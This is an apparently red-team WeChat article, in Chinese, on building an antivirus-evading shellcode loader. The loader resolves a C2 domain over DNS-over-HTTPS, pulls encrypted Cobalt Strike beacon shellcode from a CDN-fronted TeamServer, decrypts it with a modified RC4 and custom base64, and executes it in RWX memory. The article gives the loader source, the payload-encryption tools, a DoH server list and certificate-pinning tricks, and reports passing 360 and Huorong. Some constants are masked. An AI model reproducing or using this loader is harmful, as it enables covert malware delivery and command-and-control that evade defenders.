#  基于DoH的无特征shellcode加载器实现

原创 hunter  [ 认知独省 ](javascript:void\(0\);)

**认知独省** ![]()

微信号 cogniti0n

功能介绍 分享红队攻防&成长路上的所见所感。

____

___发表于_

收录于合集

## author: **hunter@深蓝攻防实验室**

基于DoH的无特征shellcode加载器实现

1\. 场景

1.1 目前面临的困难

1.2 解决了什么问题

2\. 方案/实现

2.1 服务端

2.2 客户端

2.3 连通性保障

2.4 服务端证书校验

3\. 测试

3.1 免杀测试

3.2 上线测试/流量分析

3.3 证书替换测试

4\. 简易版loader

5\. 总结  
  
---  
  
##

* * *

##  **1\. 场景**  

###  **1.1 目前面临的困难  **

在红队项目密集或同时进攻多个目标的场景下，钓鱼马批量发出去后很容易有样本被360上传，那么同一批马就会迅速在其他项目中就无法使用，被落地杀。目前360最烦人的两点就是基于QVM云引擎的静态查杀和本地行为监控，行为监控可以通过白驱动暂时瘫痪360主动防御来实现权限维持等高危操作，但这一切依然需要满足一个前提：需要现有一个shell，即马不能被静态查杀。有的马做分离免杀效果还不错。但目前只有分离成多个文件的效果还可以，而实现单文件则需要在资源段或其他段内嵌数据，解密后再释放文件到磁盘/内存，这种操作和特征对于360来说是极为敏感的。

19年的时候做过一些远程加载shellcode的尝试，但那时候一没有购买CDN、二没有支持DoH的DNS服务器，增加一次额外的payload下载过程反而给了（当时能力还不是很强的）防守方更好的溯源机会，所以没有在实战中应用过这类木马。

###  **1.2 解决了什么问题  **

1.单文件分离免杀的另一个实现方式，提升静态查杀的对抗效果。相比传统文件分离马可实现单文件落地，且没有文件操作相关API的调用，消除可疑特征。针对仅有的可疑特征——内存分配相关的API调用，可使用动态加载+syscall的形式轻松隐藏。2.木马本身不内置shellcode，静态特征不明显；且可以通过控制远程提供shellcode的服务端开启/关闭/更换路径来阻断木马上线。不会上线的木马本身也没有任何危险行为，不容易被分析。3.所有网络通信均采用自封装模块实现。底层调用标准C接口，不经过Win
API，规避启发式引擎扫描及Hook。4.内置根证书链。支持实时校验证书的有效性，可在有需求的情况下开启，有效防御流量劫持。5.开发过程沿用了之前的模块化思想，将所有自己编写/二次封装的模块编译为静态库，这样在项目过程中也可以抽时间快速开发新的木马，选择不同的模块以实现不同的功能。6.保护二开的beacon。将自研beacon的本体shellcode加密保存在云端，如果防守方应急或比赛结束后可以方便快速地关闭下载路径，配合木马的自毁，可大大减小自研beacon留在本地被厂商抓走分析的可能性。7.由于编译生成的木马自身携带libssl和libcurl等第三方库函数，底层同样调用标准C。所以理论上在Windows
XP等不支持https的系统上也可以正常进行https加密通信（但开发环境需要降低SDK版本做适配，暂时还没有做）。因此还可以基于这套二次封装的函数库结合自研beacon实现XP/03上的全加密通信，进一步规避流量审计。

  

##

* * *

##  

##  **2\. 方案/实现  **

###  **2.1 服务端  **

要实现远程加载，首先需要部署一个在互联网上的服务器，并且这个服务器要藏在CDN后面防止被溯源到固定IP直接封锁。原本想自己写一个Web平台然后新开一个CDN域名专门用来挂shellcode，但CS的TeamServer本身就支持https服务器托管文件，且路径是可以自定义的。因此直接用CS的TeamServer复用之前的CDN就可以了，省去不必要的造轮子。
![]()![]()由于TeamServer使用了CDN，因此直接访问TeamServer的IP或CDN的域名是可以看到加密托管的shellcode的，但访问CDN的IP则看不到（也就是木马实际通信的IP）。![]()![]()![]()由于这个域名是加密内置在木马中的，要提取需要花费一定精力和技术实力来分析。且即使知道了域名，防守方依然无法劫持基于DoH的域名请求。新版本操作系统的手机/电脑都可能会有DoH请求域名服务器的行为，也不便于一封了之......所以对于防守方来说，溯源的成本高且收益小。

###  **2.2 客户端  **

上面的测试也看到了，托管的beacon shellcode是加密的，因此需要在客户端内置对应的加密算法用来解密。

（P.S.之前想过使用非对称加密，但实际上如果真的被抓到进行分析，任何加密手段其实都是差不多的，公钥被拿走了还是一样还原beacon
shellcode的二进制）

我这里使用的对称加密是模仿RC4写的一个类似的算法（但不是RC4），然后将被加密后的二进制做hex编码，最后进行base64编码（这个base64编码也是魔改过的）。木马中的解密过程则是逆过来，如下图。![]()魔改算法是为了防止有经验的逆向工程师或者使用GPT这种AI插件一眼就看出来用了什么公开的算法，找到密钥后直接用现成的工具解密......这样分析的时间成本就大大降低了，有悖于我们“拖延时间”的宗旨。下面贴一下魔改版的算法实现（部分代码隐藏）。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    // 魔改RC4  
    string rc4_encrypt_decrypt(const string& data, const string& key) {    string result;    result.reserve(data.size());  
        vector<unsigned char> state(***);    for (int i = 0; i < ***; ++i) {        state[i] = i;    }  
        int j = 0;    int keyLength = key.size();  
        for (int i = 0; i < ***; ++i) {        j = (j + state[i] + key[i % keyLength]) % ***;        swap(state[i], state[j]);    }  
        int i = 0;    j = 0;  
        for (char c : data) {        i = (i + 1) % ***;        j = (j + state[i]) % ***;        swap(state[i], state[j]);        result += c ^ state[(state[i] + state[j]) % ***];    }  
        return result;}  
    // 魔改base64解码器  
    static inline bool is_base64(unsigned char c) {    return (isalnum(c) || (c == '***') || (c == '***'));}  
    string base64_decode(const string& encoded_string) {    const string base64_chars = "***************************************************";//自己可以改    size_t in_len = encoded_string.size();    int i = 0;    int j = 0;    int in_ = 0;    unsigned char char_array_4[4], char_array_3[3];    string ret;  
        while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {        char_array_4[i++] = encoded_string[in_]; in_++;        if (i == 4) {            for (i = 0; i < 4; i++)                char_array_4[i] = base64_chars.find(char_array_4[i]) & 0xff;  
                char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & ***) >> 4);            char_array_3[1] = ((char_array_4[1] & ***) << 4) + ((char_array_4[2] & 0x3c) >> 2);            char_array_3[2] = ((char_array_4[2] & ***) << 6) + char_array_4[3];  
                for (i = 0; (i < 3); i++)                ret += char_array_3[i];            i = 0;        }    }  
        if (i) {        for (j = 0; j < i; j++)            char_array_4[j] = base64_chars.find(char_array_4[j]) & 0xff;  
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & ***) >> 4);        char_array_3[1] = ((char_array_4[1] & ***) << 4) + ((char_array_4[2] & ***) >> 2);  
            for (j = 0; (j < i - 1); j++) ret += char_array_3[j];    }  
        return ret;}  
    

这样一来对大多数蓝队成员来说，即使知道了域名且访问到了加密的beacon
shellcode，第一眼看上去也是base64，但解码后会发现什么也不是。到了这一步已经足以劝退绝大部分人了。而在这个demo中，对于域名和URL
path就没有使用加密算法，只是做了hex编码+魔改base64的组合，如下图。![]()当然如果DIY的话也可以自己组合或者使用其它加密方式，这个demo只是提供一个参考思路。但这里要注意一点，即魔改的base64是不支持URL-
Safe的版本，只能编码可见字符，遇到空字节会被截断，因此不能用来直接编码二进制数据！对应解密算法写了两个加密脚本，在下面贴出来。由于加密只有在需要托管beacon
shellcode的时候才需要做，也不需要频繁使用，所以没有必要做成独立的工具。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    // HEX+B64_EncodeString.cpp  
    #include <iostream>#include <string>#include <sstream>#include <iomanip>#include <vector>  
    std::string base64_encode(const std::string& input) {    const std::string base64Chars = "**********************************************";//自己可以改    std::string encodedString;    size_t inputSize = input.size();    size_t i = 0;        while (i < inputSize) {        unsigned char char1 = input[i++];        unsigned char char2 = (i < inputSize) ? input[i++] : 0;        unsigned char char3 = (i < inputSize) ? input[i++] : 0;                unsigned char b1 = char1 >> 2;        unsigned char b2 = ((char1 & ***) << 4) | (char2 >> 4);        unsigned char b3 = ((char2 & ***) << 2) | (char3 >> 6);        unsigned char b4 = char3 & ***;                encodedString += base64Chars[b1];        encodedString += base64Chars[b2];        encodedString += (char2 ? base64Chars[b3] : '=');        encodedString += (char3 ? base64Chars[b4] : '=');    }        return encodedString;}  
    std::string hex_encode(const std::vector<unsigned char>& input) {    std::stringstream encoded_stream;    encoded_stream << std::hex << std::setfill('0');  
        for (unsigned char c : input) {        encoded_stream << std::setw(2) << static_cast<unsigned int>(c);    }  
        return encoded_stream.str();}  
    std::vector<unsigned char> hex_decode(const std::string& input) {    std::vector<unsigned char> decoded_data;  
        for (size_t i = 0; i < input.length(); i += 2) {        std::string byte_str = input.substr(i, 2);        unsigned int byte_value = std::stoul(byte_str, nullptr, 16);        decoded_data.push_back(static_cast<unsigned char>(byte_value));    }  
        return decoded_data;}  
    int main() {    unsigned char byteArray[] = {"************************"};    std::vector<unsigned char> binaryArray;    binaryArray.assign(byteArray, byteArray + sizeof(byteArray) / sizeof(byteArray[0]));        std::cout << "HEX encoded string: " << hex_encode(binaryArray) << std::endl;    std::cout << "B64 encoded agian: " << base64_encode(hex_encode(binaryArray)) << std::endl;  
        return 0;}  
    // RC4+HEX+B64_EncryptFile.cpp  
    #include <iostream>#include <fstream>#include <sstream>#include <string>#include <iomanip>#include <vector>  
    std::string base64_encode(const std::string& input) {    const std::string base64Chars = "**********************************************";    std::string encodedString;    size_t inputSize = input.size();    size_t i = 0;        while (i < inputSize) {        unsigned char char1 = input[i++];        unsigned char char2 = (i < inputSize) ? input[i++] : 0;        unsigned char char3 = (i < inputSize) ? input[i++] : 0;                unsigned char b1 = char1 >> 2;        unsigned char b2 = ((char1 & ***) << 4) | (char2 >> 4);        unsigned char b3 = ((char2 & ***) << 2) | (char3 >> 6);        unsigned char b4 = char3 & ***;                encodedString += base64Chars[b1];        encodedString += base64Chars[b2];        encodedString += (char2 ? base64Chars[b3] : '=');        encodedString += (char3 ? base64Chars[b4] : '=');    }        return encodedString;}  
    std::string hex_encode(const std::string& input) {    std::stringstream encoded;    encoded << std::hex << std::setfill('0');        for (unsigned char c : input) {        encoded << std::setw(2) << static_cast<int>(c);    }        return encoded.str();}  
    std::string rc4_encrypt_decrypt(const std::string& data, const std::string& key) {    std::string result;    result.reserve(data.size());        std::vector<unsigned char> state(***);    for (int i = 0; i < ***; ++i) {        state[i] = i;    }        int j = 0;    int keyLength = key.size();        for (int i = 0; i < ***; ++i) {        j = (j + state[i] + key[i % keyLength]) % ***;        std::swap(state[i], state[j]);    }        int i = 0;    j = 0;        for (char c : data) {        i = (i + 1) % ***;        j = (j + state[i]) % ***;        std::swap(state[i], state[j]);        result += c ^ state[(state[i] + state[j]) % ***];    }        return result;}  
    std::string read_file(const std::string& filepath) {    std::ifstream file(filepath, std::ios::binary);    if (!file) {        return "";    }        std::stringstream buffer;    buffer << file.rdbuf();        return buffer.str();}  
    int main() {    std::string filename = "/Users/hunter/Downloads/beacon.bin";    std::string key = "**********************************************";//自己可以改    std::string enc_file = rc4_encrypt_decrypt(read_file(filename), key);        std::string hex_string = hex_encode(enc_file);  
        // std::cout << "Hex encoded content of file " << filename << ":" << std::endl;    std::cout << "HEX encoded: " << std::endl;    std::cout << hex_string << std::endl;    std::cout << "B64 encoded agian: " << std::endl;    std::cout << base64_encode(hex_string) << std::endl;  
        return 0;}  
    

  

 **2.3 连通性保障    **

由于防守方无法判定是否为恶意流量，当他们杀疯了的时候是有可能会批量封锁CDN的IP的；或者某些CDN节点IP本来就是暂时失效的，所以通过DoH查询得到的IP列表并不一定都可达。

因此我在轮询查询的逻辑中添加了一个TCP端口探测的功能，即下图中调用的isTCPPortOpen()方法。当前节点IP的特定端口无法访问时，切换下一个节点IP进行测试，如果可以建立TCP三次握手则返回这个验证可达的IP地址。![]()使用方法如下，在调用secureGetHostByName()的时候加一个参数指定需要探测连通性的端口即可，由于CDN使用https协议，这个端口通常是443。![]()

###  **2.4 服务端证书校验  **

使用https的代码都是基于libcurl二次封装的，而libcurl默认状态就是支持证书校验的但这里有个天坑，掉进去了多半天才爬出来......libcurl的API参数名字容易产生误解，简而言之就是CURLOPT_SSL_VERIFYPEER开关才是验证证书有效性，而CURLOPT_SSL_VERIFYHOST开关其实只是验证证书里面的CN/SAN等字段和请求的URL种的域名/IP是否吻合，但并不会验证证书的有效性。详细说明如下。![]()![]()举个例子，比如挂上代理后通过burp访问百度，我们看到的证书是这样的：![]()很显然，证书被burp替换了，浏览器会告警；这时候如果再访问搜狐，看到的证书是这样的：![]()burp是会根据我们访问的host来动态修改证书的，而并不关心证书是否有效。如下图可以看到，右边被修改过的证书在Windows下会提示损坏，而左边的则是burp直接导出的自签名证书。![]()因此如果没仔细看API文档，以为“PEER”代表的是客户端证书校验，那就根本起不到防中间人的作用。但是开启证书校验后我们需要根CA证书来验证信任链，而对于一个需要尽可能不做可疑行为的木马来说，肯定不能去用户的文件系统里搜索根证书，也最好不要随便释放文件。所以我们可以将自己携带根证书的数据（硬编码），用CURLOPT_CAINFO_BLOB来直接从内存里加载根证书，如下（这里要先设置CURLOPT_CAINFO为空指针，阻止libcurl优先去文件系统中找根证书的数据）。![]()

  

##

* * *

##  

##  **3\. 测试  **

###  **3.1 免杀测试  **

简易的loader（没做任何源码和API处理）可过最新版360和火绒。![]()![]()

###  **3.2 上线测试/流量分析**  

如下图所示，可以正常上线，且从本地查看的所有网络行为均为https，看不到域名解析的动作。![]()![]()![]()抓取全部流量分析，可以发现没有关联C2域名的DNS请求，下面的DNS请求是测试demo中内置的360的DoH域名服务器的域名，如果不想有这个解析过程的流量也可以直接硬编码域名服务器的IP地址（通常情况下没有必要）。![]()剩下的就全都是TLS加密流量了，对端IP是CDN节点。![]()而握手过程中JA3指纹也是OpenSSL库默认的，并没有什么特征。![]()

###

###  **3.3 证书替换测试  **

没开启代理的时候运行程序（为方便查看细节，下面图中开启了Debug信息输出），可以通过证书校验并成功请求域名然后下载加密的beacon，如下。![]()![]()![]()开启代理后，可以看到burp自作聪明的给伪造了个域名，但实际上我们的host写的是ip，因此直接就没有通过host校验，程序退出。![]()如果我们放宽一些限制，关闭DoH部分的证书校验，再使用域名来请求DoH服务器，可以看到程序到链接C2-CDN的时候会由于证书校验没有通过而被终止。![]()此时代理上也是没有抓到任何有效流量的。![]()

##

##  

* * *

##  

##  **4\. 简易版loader**  

##  最后看一下这个简易版loader的本体

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    # include <iostream># include "dns-over-https.h"  
    #pragma comment(lib, "dns-over-https-MD.lib")#pragma comment(lib, "dns-over-https-MT.lib")  
    void runShellcode(string shellcode_str) {// 这里的VirtualAlloc可以通过动态加载地址的方式隐藏API调用；// 如果想彻底避免R3 API Hook，也可以直接使用syscall；// 本文主要关注分离免杀和流量隐匿，故不做展开。    void* exec = VirtualAlloc(0, shellcode_str.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);    if (exec != NULL) {        memcpy(exec, shellcode_str.c_str(), shellcode_str.size());        ((void(*)())exec)();    }}  
    string findValidDohServer() {    string tmpAddr = "";    while (TRUE) {        srand(time(NULL));        int randIndex = rand() % 16;        char dohServerList[16][256] = {            "208.67.222.222",            "208.67.220.220",            "1.0.0.1",            "1.1.1.1",            "8.8.8.8",            "8.8.4.4",            "185.222.222.222",            "185.184.222.222",            "223.5.5.5",            "223.6.6.6",            "120.53.53.53",            "1.12.12.12",            "101.199.113.208",            "36.99.170.86",            "180.163.249.75",            "175.24.154.66",        };        tmpAddr = dohServerList[randIndex];        if (isTCPPortOpen(tmpAddr, 443)) {            break;        }        else {            continue;        }            }    return "https://" + tmpAddr + "/dns-query";}  
    int main(int argc, char** argv){    string encodedDomainName = "P9g*****************************2tWD297e2AZ=";    string decodedDomainName = hex_decode(base64_decode(encodedDomainName));    string encodedPath = "PcSDP********************************AWB7cZo";    string decodedPath = hex_decode(base64_decode(encodedPath));    string key = "***********************";  
        string ipRes = secureGetHostByName(findValidDohServer().c_str(), (char*)decodedDomainName.data(), 443).addr;    string data = httpsGet((char*)decodedDomainName.data(), ipRes, decodedPath);    string shellcode_str = rc4_encrypt_decrypt(hex_decode(base64_decode(data)), key);  
        if (shellcode_str.size() > 0)        runShellcode(shellcode_str);  
        return 0;}  
    

##

## 如代码所示，没有做任何免杀处理，只是没有内置beacon
shellcode。这个demo中的16个IP地址就是国内外常用的支持DoH的域名服务器（实际上还有更多）。这里我写的是随机取，当然也可以做有限次数的轮询，确保使用可以访问的服务器。防守方再疯狂也不至于上来就封掉所有域名服务器地址吧......

但根据免杀效果的测试来看，已经轻松过关了。

  

##

* * *

  

 **5\. 总结    **  

比起几年前不成熟的尝试，这次做的分离木马没有再过多关注木马本身，主要精力放在了模块化开发上。因为首先对于如何执行shellcode的骚操作有很多，每个会写木马的都有一些自己独到的想法，但每人写的源码都互不兼容，如果在项目中有快速开发/修改的需求的话就会很被动。所以不管是DoH模块、https请求模块，还是另一个自写库函数中的反沙箱/反调试模块，都旨在可以实现快速的“搭积木式”木马开发。比如当我们想做个最普通的钓鱼木马时，只导入一个反调试模块就好，如果防守比较严格的情况下需要做分离木马，但又最好是单文件，那么就可以尝试这种远程加载的方式，导入对应模块调用封装好的函数即可快速成形。这些库函数集合日后还会不定期更新，后面也会看需求加入一些各种各样的执行shellcode的花活。

![]()

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

